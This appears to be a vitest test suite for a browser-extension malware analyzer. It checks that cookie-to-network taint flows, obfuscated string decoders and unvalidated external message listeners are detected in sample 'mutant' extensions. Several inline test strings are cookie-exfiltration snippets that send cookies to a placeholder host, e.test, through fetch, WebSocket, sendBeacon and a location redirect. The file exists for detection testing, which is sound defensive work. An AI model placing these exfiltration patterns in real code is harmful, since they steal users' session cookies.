import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { analyzeScript } from "../src/pipeline/layer3-ast/index.ts";

const src = (sample: string, file: string) => readFileSync(`corpus/${sample}/extension/${file}`, "utf8");

describe("Layer 3b — taint sketches", () => {
  it("links cookie source to fetch sink within mutant A (single file)", () => {
    const s = analyzeScript("js/background.js", src("mutant-a-exfil-fetch", "js/background.js"));
    const cookieToNet = s.taint_sketches.find((t) => /cookie/.test(t.classification) && /network|fetch/.test(t.classification));
    expect(cookieToNet).toBeDefined();
    expect(cookieToNet!.sink.api).toBe("fetch");
  });

  it("does NOT link the cross-file chain in mutant E's background (blind spot)", () => {
    const s = analyzeScript("js/background.js", src("mutant-e-crossfile-flow", "js/background.js"));
    // background.js stores cookies in chrome.storage; the fetch lives in another
    // file, so no single-file cookie->network taint chain should exist.
    expect(s.taint_sketches.some((t) => /network/.test(t.classification))).toBe(false);
  });
});

// Improvement 007 — taint must see normalized callees and promise-form sources.
describe("Layer 3b — taint normalization + promise sources (007)", () => {
  const run = (code: string) => analyzeScript("js/x.js", code);
  const cookieToNet = (code: string) =>
    run(code).taint_sketches.some((t) => t.classification === "cookie-source-to-network-sink");

  it("links a cookie source to window.fetch (receiver-normalized sink)", () => {
    expect(cookieToNet('chrome.cookies.getAll({}, c => window.fetch("https://e.test", {body: JSON.stringify(c)}))')).toBe(true);
  });

  it("links a cookie source to an aliased fetch (const f = fetch)", () => {
    expect(cookieToNet('const f = fetch; chrome.cookies.getAll({}, c => f("https://e.test", {body: JSON.stringify(c)}))')).toBe(true);
  });

  it("links a browser.cookies source (browser.→chrome. normalization)", () => {
    expect(cookieToNet('browser.cookies.getAll({}, c => fetch("https://e.test", {body: JSON.stringify(c)}))')).toBe(true);
  });

  it("tracks the await form: const c = await chrome.cookies.getAll({})", () => {
    expect(cookieToNet('async function go(){ const c = await chrome.cookies.getAll({}); fetch("https://e.test", {body: JSON.stringify(c)}); }')).toBe(true);
  });

  it("tracks the .then form: chrome.cookies.getAll({}).then(c => …)", () => {
    expect(cookieToNet('chrome.cookies.getAll({}).then(c => fetch("https://e.test", {body: JSON.stringify(c)}))')).toBe(true);
  });
});

describe("Layer 3b — extended taint sink set (007)", () => {
  const run = (code: string) => analyzeScript("js/x.js", code);

  it("flags cookie data flowing into XHR/WebSocket .send", () => {
    const s = run('const ws = new WebSocket("wss://e.test"); chrome.cookies.getAll({}, c => ws.send(JSON.stringify(c)))');
    const t = s.taint_sketches.find((x) => x.classification === "cookie-source-to-network-sink");
    expect(t).toBeDefined();
    expect(t!.sink.api).toBe("ws.send");
  });

  it("flags cookie data flowing into navigator.sendBeacon", () => {
    const s = run('chrome.cookies.getAll({}, c => navigator.sendBeacon("https://e.test", JSON.stringify(c)))');
    expect(s.taint_sketches.some((t) => t.classification === "cookie-source-to-network-sink" && t.sink.api === "navigator.sendBeacon")).toBe(true);
  });

  it("flags cookie data flowing into a location assignment (URL exfil)", () => {
    const s = run('const c = document.cookie; location.href = "https://e.test/?x=" + c');
    expect(s.taint_sketches.some((t) => t.classification === "cookie-source-to-navigation-sink")).toBe(true);
  });
});

describe("Layer 3b — obfuscation", () => {
  it("flags mutant C's obfuscated string-array decoder", () => {
    const s = analyzeScript("js/_locale_pack.js", src("mutant-c-obfuscated-decoder", "js/_locale_pack.js"));
    expect(s.obfuscation).not.toBeNull();
    expect(s.obfuscation!.string_array_decoder_detected).toBe(true);
    expect(s.obfuscation!.flagged).toBe(true);
  });

  it("does not flag a clean first-party file", () => {
    const s = analyzeScript("js/common-utils.js", src("demo-cookie-manager", "js/common-utils.js"));
    expect(s.obfuscation!.flagged).toBe(false);
  });

  it("flagging a vendored minified library is acceptable (expected noise)", () => {
    const s = analyzeScript("lib/jquery-3.3.1.min.js", src("demo-cookie-manager", "lib/jquery-3.3.1.min.js"));
    expect(s.obfuscation!.flagged).toBe(true);
  });
});

describe("Layer 3b — listeners", () => {
  it("flags mutant D's unvalidated onMessageExternal listener", () => {
    const s = analyzeScript("js/background.js", src("mutant-d-wide-externally-connectable", "js/background.js"));
    const ext = s.listeners.find((l) => l.kind.includes("onMessageExternal"));
    expect(ext).toBeDefined();
    expect(ext!.validates_sender).toBe(false);
  });

  it("records listeners in ExtRay Demo Cookie Manager's background", () => {
    const s = analyzeScript("js/background.js", src("demo-cookie-manager", "js/background.js"));
    expect(s.listeners.length).toBeGreaterThan(0);
  });
});
